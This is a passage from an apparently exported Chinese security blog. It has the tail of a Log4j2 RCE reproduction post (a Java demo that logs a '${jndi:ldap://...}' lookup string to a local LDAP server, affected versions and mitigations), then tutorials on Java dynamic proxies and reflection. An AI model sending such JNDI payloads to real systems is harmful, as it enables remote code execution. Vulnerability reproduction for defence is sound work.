-<p>![image-20220207115341295](Apache Log4j2 RCE漏洞复现&#x2F;image-20220207115341295.png)</p>
-<p>下面为测试Demo(由于我的jdk版本不适用RMI-JDNI注入，这里使用的是ldap协议)</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LogManager.getLogger(Test.class);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:1389/ehm23c&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>运行结果:</p>
-<p>![image-20220207115350383](Apache Log4j2 RCE漏洞复现&#x2F;image-20220207115350383.png)</p>
-<h2 id="痕迹分析"><a href="#痕迹分析" class="headerlink" title="痕迹分析"></a>痕迹分析</h2><p>主要查看日志，观察日志中是否存在错误记录</p>
-<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>经验证 2.15.0-rc1 版本存在绕过，实际受影响范围如下：</p>
-<p>Apache Log4j 2.x &lt; 2.15.0-rc2</p>
-<p>影响判断方式：用户只需排查Java应用是否引入 log4j-api , log4j-core 两个jar。若存在应用使用，极大可能会受到影响。</p>
-<p><strong>已知影响组件</strong></p>
-<ul>
-<li>Apache Struts2</li>
-<li>Apache Solr</li>
-<li>Apache Flink</li>
-<li>Apache Druid</li>
-<li>ElasticSearch</li>
-<li>flume</li>
-<li>dubbo</li>
-<li>Redis</li>
-<li>logstash</li>
-<li>kafka</li>
-</ul>
-<h2 id="防护方案"><a href="#防护方案" class="headerlink" title="防护方案"></a>防护方案</h2><p>1、禁止使用 log4j 服务器外连，升级 jdk 11.0.1 8u191 7u201 6u211 或更高版本。 </p>
-<p>2、升级至 log4j-2.15.0-rc2： </p>
-<p>下载地址：<a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a> </p>
-<p>3、紧急缓解措施： </p>
-<p>（1） 修改 jvm 参数 -Dlog4j2.formatMsgNoLookups&#x3D;true </p>
-<p>（2） 修改配置 log4j2.formatMsgNoLookups&#x3D;True </p>
-<p>（3） 将系统环境变量FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置 为 true</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1] <a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1</a></p>
-<p>[2] [<a href="https://issues.apache.org/jira/projects/LOG4J2/issues/LOG4J2-3201?filter=allissues">LOG4J2-3201] Limit the protocols jNDI can use and restrict LDAP. - ASF JIRA (apache.org)</a></p>
-<p>[3] <a href="https://gitbox.apache.org/repos/asf?p=logging-log4j2.git;a=blob;f=log4j-core/src/test/java/org/apache/logging/log4j/core/lookup/JndiRestrictedLookupTest.java;h=032c9c4d85204e6490a734724c8d549c50de7164;hb=d82b47c">ASF Git Repos - logging-log4j2.git&#x2F;blob - log4j-core&#x2F;src&#x2F;test&#x2F;java&#x2F;org&#x2F;apache&#x2F;logging&#x2F;log4j&#x2F;core&#x2F;lookup&#x2F;JndiRestrictedLookupTest.java</a></p>
-<p>[4] <a href="https://mp.weixin.qq.com/s/RXSiFrj5UOs3kzXSUsMbvw">Apache Log4j2RCE漏洞复现 (qq.com)</a></p>
-]]></content>
-      <categories>
-        <category>Web漏洞</category>
-        <category>Web容器漏洞</category>
-        <category>Apache</category>
-      </categories>
-      <tags>
-        <tag>-web漏洞 -Apache漏洞 -Log4j2</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Java动态代理</title>
-    <url>/2022/02/08/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</url>
-    <content><![CDATA[<h1 id="Java动态代理"><a href="#Java动态代理" class="headerlink" title="Java动态代理"></a>Java动态代理</h1><p>动态代理在Java中有着广泛的应用，比如Spring AOP、Hibernate数据查询、测试框架的后端mock、RPC远程调用、Java注解对象获取、日志、用户鉴权、全局性异常处理、性能监控，甚至事务处理等</p>
-<h2 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h2><p>创建一个代理对对象进行包装，用该代理对象取代原对象。后续操作中，任何对原对象的调用都要先通过代理对象。代理对象决定是否将方法调用转到原对象上。</p>
-<p>代理模式是一种结构型设计模式，代理模式角色分为 3 种:</p>
-<p><strong>Subject（抽象主题角色）</strong>：定义代理类和真实主题的公共对外方法，也是代理类代理真实主题的方法；</p>
-<p><strong>RealSubject（真实主题角色</strong>）：真正实现业务逻辑的类；</p>
-<p><strong>Proxy（代理主题角色）</strong>：用来代理和封装真实主题；</p>
-<p>代理模式的结构比较简单，其核心是代理类，为了让客户端能够<strong>一致性地对待</strong>真实对象和代理对象，在代理模式中引入了抽象层.</p>
-<p>代理模式<strong>按照职责</strong>（使用场景）来分类，至少可以分为以下几类：</p>
-<p>1、远程代理  </p>
-<p>2、虚拟代理 </p>
-<p> 3、Copy-on-Write 代理   </p>
-<p>4、保护（Protect or Access）代理  </p>
-<p>5、Cache代理 </p>
-<p> 6、防火墙（Firewall）代理  </p>
-<p>7、同步化（Synchronization）代理 </p>
-<p> 8、智能引用（Smart Reference）代理等等。</p>
-<p>如果<strong>根据字节码的创建时机</strong>来分类，可以分为静态代理和动态代理：</p>
-<ul>
-<li>所谓<strong>静态</strong>也就是在<strong>程序运行前</strong>就已经存在代理类的<strong>字节码文件</strong>，代理类和真实主题角色的关系在运行前就确定了。</li>
-<li>而动态代理的源码是在程序运行期间由<strong>JVM</strong>根据反射等机制<strong>动态的生成</strong>，所以在运行前并不存在代理类的字节码文件。</li>
-</ul>
-<h2 id="代理模式优势"><a href="#代理模式优势" class="headerlink" title="代理模式优势"></a>代理模式优势</h2><p>代理模式能够赋予我们控制访问某个类的能力，在某些情况下，代理可以允许我们屏蔽或控制某个对象的逻辑。在此基础上，引申出来的作用，也是目前开发中最常使用的作用：<code>在不修改原对象代码的基础上，对原对象的功能进行修改或者增强</code>。</p>
-<h3 id="解耦"><a href="#解耦" class="headerlink" title="解耦"></a>解耦</h3><p>降低耦合度甚至解除耦合</p>
-<p><strong>耦合</strong></p>
-<p>当项目中的各个模块或者各个组件，当一个发生变动或者调用的时候，其他一些模块或组件也会产生变化或者调用，类似于齿轮的运转。</p>
-<p><strong>耦合的问题</strong></p>
-<p>当模块或组件耦合度过高时，会带来难以扩展、维护性差、纠错困难等问题，所以在设计时，要尽可能避免模块或组件之间的耦合度过高。</p>
-<p>当我们想要给某个对象添加有些额外逻辑时，就可以使用代理模式，在不修改原代码的前提下，只针对额外功能进行编码。在整个过程中，原对象的逻辑和额外逻辑完全解耦，互不干扰。</p>
-<h3 id="高扩展"><a href="#高扩展" class="headerlink" title="高扩展"></a>高扩展</h3><p>由于模块之间的解耦性，我们可以随时添加任意的功能或者修改之前的功能而不影响原模块的正常执行。</p>
-<h2 id="JAVA代理模式"><a href="#JAVA代理模式" class="headerlink" title="JAVA代理模式"></a>JAVA代理模式</h2><p>Java中有三种方式来创建代理对象：</p>
-<ul>
-<li>静态代理</li>
-<li>基于JDK(接口)的动态代理</li>
-<li>基于CGLIB(Jar包)的动态代理</li>
-</ul>
-<h3 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h3><hr>
-<p>手写代理类的代码，工程中有代理类的源码，代理类会编译执行。实现目标类的接口或者直接继承目标类，完成逻辑的修改和增强。</p>
-<h4 id="接口实现方式"><a href="#接口实现方式" class="headerlink" title="接口实现方式"></a>接口实现方式</h4><img src="/2022/02/08/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/image-20220208183027419.png" class title="image-20220208183027419">
-
-<p>目标类:  程序猿(Developer) </p>
-<p>代理类:   Java程序猿(JavaDeveloper)  FullStack程序猿(FullStackDeveloper)</p>
-<p>程序猿(Develpoer.java)</p>
-<p>定义一个程序员的接口，只干两件事情（程序员太忙，别的做不了）</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Developer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">coded</span><span class="params">()</span></span>;<span class="comment">//会写代码</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">debug</span><span class="params">()</span></span>;<span class="comment">//会调试程序</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>java程序猿会开发和调试java代码</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaDeveloper</span> <span class="keyword">implements</span> <span class="title">Developer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">JavaDeveloper</span><span class="params">(String name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">pubic <span class="keyword">void</span> <span class="title">code</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println(<span class="keyword">this</span>.name+<span class="string">&quot;is  codding JavaDeveloper&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">debug</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println(<span class="keyword">this</span>.name+<span class="string">&quot;is debugging JavaDeveloper&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>然后有个FullStack程序猿，在开发之前都会祈祷一下，这样他的代码就不会有bug，也不需要调试。</p>
-<img src="/2022/02/08/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/image-20220208180230522.png" class title="image-20220208180230522">
-
-<p>全栈程序猿(FullStackDeveloper.java)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class FullStackDeveloper implements Developer &#123;</span><br><span class="line">   private Developer developer;</span><br><span class="line">   public FullStackDeveloper(Developer developer)</span><br><span class="line">   &#123;</span><br><span class="line">       this.developer = developer;</span><br><span class="line">   &#125;</span><br><span class="line">   public void code()</span><br><span class="line">   &#123;</span><br><span class="line">       System.out.println(&quot;FullStackDeveloper is praying for the code!&quot;);</span><br><span class="line">       this.developer.code();</span><br><span class="line">    &#125;</span><br><span class="line">    public void debug()</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(&quot;FullStackDeveloper&#x27;s  code is bug-free and does not require dedbugging&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>主函数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class App &#123;</span><br><span class="line">    public static void main(String[] args)</span><br><span class="line">    &#123;</span><br><span class="line">        Developer str = new JavaDeveloper(&quot;YZT&quot;);</span><br><span class="line">        Developer developer = new FullStackDeveloper(str);</span><br><span class="line">        developer.code();</span><br><span class="line">        developer.debug();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>运行结果:</p>
-<img src="/2022/02/08/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/image-20220208182141430.png" class title="image-20220208182141430">
-
-<p>如果YZT只是一个普通的Java程序猿，则开发结果是:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">YZT is  codding JavaDeveloper!</span><br><span class="line"></span><br><span class="line">YZT is  debugging  JavaDeveloper!</span><br></pre></td></tr></table></figure>
-
-
-
-<p>但YZT是个全栈程序猿是这样的:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">YZT is  praying for the code!</span><br><span class="line">YZT is  codding JavaDeveloper!</span><br><span class="line">YZT&#x27;code is bug-free and does not require dedbugging!</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="继承方式"><a href="#继承方式" class="headerlink" title="继承方式"></a>继承方式</h4><img src="/2022/02/08/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/image-20220208183204722.png" class title="image-20220208183204722">
-
-<p><strong>示例</strong></p>
-<p>目标类:  程序猿(Developer) </p>
-<p>代理类:   Java程序猿(JavaDeveloper)</p>
-<p>程序猿类(Developer)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Developer &#123;</span><br><span class="line">    public String  code(String str)</span><br><span class="line">    &#123;</span><br><span class="line">     return str+&quot; is coding Developer!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public String  debug(String str)</span><br><span class="line">    &#123;</span><br><span class="line">        return str+&quot; is a debugging Developer!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>Java程序猿(javaDeveloper)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class JavaDeveloper extends Developer &#123;</span><br><span class="line">    public String code(String str)</span><br><span class="line">    &#123;</span><br><span class="line">        String str1 = super.code(str);</span><br><span class="line">        String str2 = super.debug(str);</span><br><span class="line">        System.out.println(&quot;Wish you have a good Luck!&quot;);</span><br><span class="line">        return str1 +str2+ &quot; He will become a good Developer!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>主程序</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class App &#123;</span><br><span class="line">    public static void main(String[] args)</span><br><span class="line">    &#123;</span><br><span class="line">        Developer developer = new JavaDeveloper();</span><br><span class="line">        System.out.println(developer.code(&quot;YZT&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>运行结果:</p>
-<img src="/2022/02/08/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/image-20220208190213980.png" class title="image-20220208190213980">
-
-
-
-<h4 id="存在问题"><a href="#存在问题" class="headerlink" title="存在问题"></a>存在问题</h4><p>静态代理虽然能实现代理模式，完成解耦，但是静态代理类的代码维护依然非常复杂，一旦接口或者父类发生了变动，则代理类的代码就得随之修改，代理类多的时候维护十分麻烦。</p>
-<h3 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h3><p>在内存中生成代理对象的技术。整个代理过程在内存中进行，不需要手动写代理类的代码，也不存在代理类的编译过程，而是直接在Java运行期，凭空在JVM中生成一个代理类对象，供我们使用。</p>
-<h4 id="基于JDK的动态代理"><a href="#基于JDK的动态代理" class="headerlink" title="基于JDK的动态代理"></a>基于JDK的动态代理</h4><p>JDK自带的动态代理技术，需要使用静态方法来创建代理对象，要求目标类必须实现接口。</p>
-<p><strong>Developer.java</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public interface Developer &#123;</span><br><span class="line">        void code();//会写代码</span><br><span class="line">        void debug();//会调试程序</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>GoodDeveloper.java</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class GoodDeveloper implements Developer &#123;</span><br><span class="line">    private String name;</span><br><span class="line">    public  GoodDeveloper(String name)</span><br><span class="line">    &#123;</span><br><span class="line">        this.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    public void code() &#123;</span><br><span class="line">        System.out.println(this.name+&quot; is coding Gooddeveloper!!!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public void debug() &#123;</span><br><span class="line">        System.out.println(this.name+&quot; is debugging Gooddeveloper!!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p><strong>ProxyTest.java</strong></p>
-<p>动态代理的例子采用了lambda表达式，主要代码是对InvocationHandler的实现。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line">public class ProxyTest &#123;</span><br><span class="line">    public static void main(String[] args) throws Throwable &#123;</span><br><span class="line">        Developer developer = new GoodDeveloper(&quot;YZT&quot;);</span><br><span class="line">        //新建Developer类型，GoodDeveloper对象</span><br><span class="line">        Developer developerproxy = (Developer) Proxy.newProxyInstance(developer.getClass().getClassLoader(),developer.getClass().getInterfaces(),(proxy, method, args1) -&gt;&#123;</span><br><span class="line">            if(method.getName().equals(&quot;code&quot;))</span><br><span class="line">            &#123;</span><br><span class="line">                System.out.println(&quot;YZT is praying for the code!!!&quot;);</span><br><span class="line">                return method.invoke(developer,args1);</span><br><span class="line"></span><br><span class="line">            &#125; else if (method.getName().equals(&quot;debug&quot;)) &#123;</span><br><span class="line">                System.out.println(&quot;YZT&#x27;s code is bug-free and does not require debugging!!!&quot;);</span><br><span class="line">                return method.invoke(developer,args1);</span><br><span class="line">            &#125;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;);</span><br><span class="line">        //labmba匿名函数，新建Developer类型接口，定义方法体输入结果对code()和debug()函数进行动态设置</span><br><span class="line">        developerproxy.code();</span><br><span class="line">        developerproxy.debug();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>运行结果:</p>
-<img src="/2022/02/08/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/image-20220210103459006.png" class title="image-20220210103459006">
-
-
-
-<h5 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h5><p>developerproxy的类型是Developer接口，而不是一个实现类。developer是基于Developer接口和GoodDeveloper的实现类加载代理出来的对象，并不属于任何一个实现类。</p>
-<p>我们来看下<strong>ProxyTest.java</strong>中的newProxyInstance()接口:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java.lang.reflect.Proxy @NotNull </span><br><span class="line">public static Object newProxyInstance(ClassLoader loader,@NotNull Class&lt;?&gt;[] interfaces,             @NotNull reflect.InvocationHandler h)</span><br><span class="line">throws IllegalArgumentException</span><br></pre></td></tr></table></figure>
-
-<p>接口中包括三个参数:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ClassLoader loader：固定写法，执行目标类对象的类加载器即可，用于加载目标类及其接口的代码</span><br><span class="line"></span><br><span class="line">Class&lt;?&gt;[] interfaces：固定写法，指定目标类对象的所有接口的Class对象的数组，通常使用目标类的Class对象调用getInterfaces()即可得到</span><br><span class="line"></span><br><span class="line">InvocationHandler h：这个参数是一个接口，主要关注它里面唯一一个方法，invoke方法。它会在代理对象调用方法时执行。也就是说，在代理类对象中调用任何方法，都会执行到invoke()方法。所以在该方法中完成对增强或扩展代码逻辑</span><br></pre></td></tr></table></figure>
-
-<p>loader和interfaces决定这个类到底是个怎么样的类。而h是InvocationHandler，决定这个代理类到底是多了什么功能。所以动态代理的内容重点就是这个InvocationHandler。</p>
-<h4 id="基于CGLIB-父类-的动态代理"><a href="#基于CGLIB-父类-的动态代理" class="headerlink" title="基于CGLIB(父类)的动态代理"></a>基于CGLIB(父类)的动态代理</h4><p>该方式是通过一个静态方法来创建代理对象，不要求目标类实现接口，但是对于目标类不能使用final进行修饰变量，基于目标类生成一个子类作为代理类，所以必须被继承。</p>
-<p>首先在pom.xml文件中添加CGLIB依赖并下载 相关依赖文件资源。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;cglib&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;cglib&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;3.3.0&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<p><strong>Cglibtest.java</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ublic class Cglibtest &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        // 创建一个目标类对象，也就是顾客对象</span><br><span class="line">        Developer developer = new Developer(&quot;YZT&quot;);</span><br><span class="line">        // 使用CGLIB创建代理类对象</span><br><span class="line">        Developer proxy = (Developer) Enhancer.create(developer.getClass(), new MethodInterceptor() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public Object intercept(Object proxy, Method method, Object[] objects, MethodProxy methodProxy) throws Throwable &#123;</span><br><span class="line">                if(&quot;code&quot;.equals(method.getName()))&#123;</span><br><span class="line">                    System.out.println(&quot;YZT is praying for the code!!!&quot;);</span><br><span class="line">                    return method.invoke(developer, args);</span><br><span class="line">                &#125;else if (&quot;debug&quot;.equals(method.getName()))&#123;</span><br><span class="line">                    System.out.println(&quot;YZT&#x27;s code is bug-free and does not require debugging!!!&quot;);</span><br><span class="line">                    return method.invoke(developer, args);</span><br><span class="line">                &#125;</span><br><span class="line">                return null;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        proxy.code();</span><br><span class="line">        proxy.debug();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Enhancer.create(Class type, Callback callback)</span><br></pre></td></tr></table></figure>
-
-<p>参数列表</p>
-<p><strong>Class type</strong>：指定目标类Class对象，也就是目标类类型</p>
-<p><strong>Callback callback</strong>：Callback是一个接口，该接口只是一个名称定义接口，并不包含方法的声明，所以使用时通常使用它的一个子接口<code>MethodInterceptor</code>，<code>MethodInterceptor</code>接口中只有一个方法：<code>intercept</code>。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">Object <span class="title">intercept</span><span class="params">(Object proxy, Method method, Object[] objects, MethodProxy methodProxy)</span></span></span><br></pre></td></tr></table></figure>
-
-<p><strong>proxy</strong>：代理类对象</p>
-<p><strong>method</strong>：对应的是出发intercept执行的方法的Method对象</p>
-<p><strong>args</strong>：代理对象调用方法时，传递的实际参数</p>
-<p>前三个参数与基于JDK的参数一致</p>
-<p><strong>methodProxy</strong>：方法的代理对象，一般也不作处理，可以暂时忽略</p>
-<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>Proxy角色在执行代理业务的时候，无非是在调用真正业务之前或者之后做一些“额外”业务。 </p>
-<img src="/2022/02/08/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/image-20220210111635827.png" class title="image-20220210111635827">
-
-<p>代理类处理的逻辑很简单，在调用某个方法前及方法后做一些额外的业务。换一种思路就是，在触发（invoke）真实角色的方法之前或者之后做一些额外的业务。为了构造出具有通用、简单的代理类，可以将所有的触发真实角色动作交给一个触发的管理器。这种管理器就是InvocationHandler。</p>
-<img src="/2022/02/08/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/image-20220210111716233.png" class title="image-20220210111716233">
-
-
-
-<p>在这种模式之中，代理Proxy和RealSubject需要实现相同的功能（函数方法）。</p>
-<p>面向对象的编程之中，想要约定Proxy和RealSubject实现相同的功能（函数方法）有两种方式</p>
-<p>a、定义一个功能接口，Proxy 和RealSubject都实现这个接口。</p>
-<p>b、通过继承，Proxy继承自RealSubject，这样Proxy则拥有了RealSubject的功能，</p>
-<p>JDK中提供的创建动态代理的机制采用a思路；而cglib采用b思路（spring两者都使用了）。 </p>
-]]></content>
-      <categories>
-        <category>代码审计</category>
-        <category>java</category>
-        <category>基础知识</category>
-      </categories>
-      <tags>
-        <tag>-代码审计 -JAVA基础</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>java反射机制</title>
-    <url>/2021/12/07/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/</url>
-    <content><![CDATA[<h1 id="java反射机制"><a href="#java反射机制" class="headerlink" title="java反射机制"></a>java反射机制</h1><p>本篇文章记录java的反射机制，虽然现在还不知道对渗透安全来说有什么好处，管他的，就是学@@</p>
-<h2 id="什么是反射"><a href="#什么是反射" class="headerlink" title="什么是反射"></a>什么是反射</h2><blockquote>
-<p>反射这个词啊，就是事物对外部动作刺激作出的相应反馈。今天学习的是java反射，那这又是什么东东呢？跟着小透来领略java带来的震撼和有趣吧！</p>
-</blockquote>
-<p>Java反射机制就是在程序运行状态中，动态调用任意一个类及其该类的所有属性和方法。(说实话，我TM看到这个解释的时候，一脸？？？)</p>
-<p>下面我们将反射机制和直接类对象初始化作一个对比:</p>
-<p>下面是自己写的helloworld类</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.fanseTest;</span><br><span class="line"></span><br><span class="line">public class helloworld</span><br><span class="line">&#123;</span><br><span class="line">       public void hello(String str)</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(str.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<ul>
-<li>直接类对象实例化</li>
-</ul>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      helloworld test = <span class="keyword">new</span> helloworld();</span><br><span class="line">      test.hello(<span class="string">&quot;helloworld&quot;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
-
-<p>运行结果:</p>
-<img src="/2021/12/07/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20211203210538333.png" class title="image-20211203210538333">
-
-
-
-<ul>
-<li>使用反射机制调用实例化</li>
-</ul>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fanseTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">fanse</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException </span>&#123;</span><br><span class="line">        Class test = Class.forName(<span class="string">&quot;com.fanseTest.helloworld&quot;</span>);</span><br><span class="line">        Method test1 = test.getMethod(<span class="string">&quot;hello&quot;</span>, String.class);</span><br><span class="line">        Constructor constructor = test.getConstructor();</span><br><span class="line">        Object test2 = constructor.newInstance();</span><br><span class="line">        test1.invoke(test2, <span class="string">&quot;helloworld&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>运行结果:</p>
-<img src="/2021/12/07/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20211203212216759.png" class title="image-20211203212216759">
-
-
-
-<p>我们可以从上面两个的对比来看，第一种是在运行前将类实例化成对象并调用方法赋值，第二种反射机制是在运行时动态调用方法和属性赋值。</p>
-<h2 id="反射的利弊"><a href="#反射的利弊" class="headerlink" title="反射的利弊"></a>反射的利弊</h2><p>Java反射机制(Reflection)是java非常重要的动态特性，我们不仅可以通过反射获取到任何类的方法(Methods)，成员变量(Fields)，构造方法(Constructors)等信息，还能动态创建任何类实例，</p>
-<h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ul>
-<li><p>可扩展性</p>
-<p>应用程序可以利用全限定名创建可扩展对象的实例，来使用来自外部的用户自定义类。</p>
-</li>
-<li><p>类浏览器和可视化开发环境</p>
-<p>一个类浏览器需要可以枚举类的成员。可视化开发环境（如 IDE）可以从利用反射中可用的类型信息中受益，以帮助程序员编写正确的代码。</p>
-</li>
-<li><p>调试器和测试工具</p>
-<p>调试器需要能够检查一个类里的私有成员。测试工具可以利用反射来自动地调用类里定义的可被发现的 API 定义，以确保一组测试中有较高的代码覆盖率。</p>
-</li>
-</ul>
-<h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><ul>
-<li><p>性能开辟</p>
-<p>反射涉及了动态类型的解析，所以 JVM 无法对这些代码进行优化。因此，反射操作的效率要比那些非反射操作低得多。我们应该避免在经常被执行的代码或对性能要求很高的程序中使用反射。</p>
-</li>
-<li><p>安全限制</p>
-<p>使用反射技术要求程序必须在一个没有安全限制的环境中运行。如果一个程序必须在有安全限制的环境中运行，如 Applet。</p>
-</li>
-<li><p>内部暴露</p>
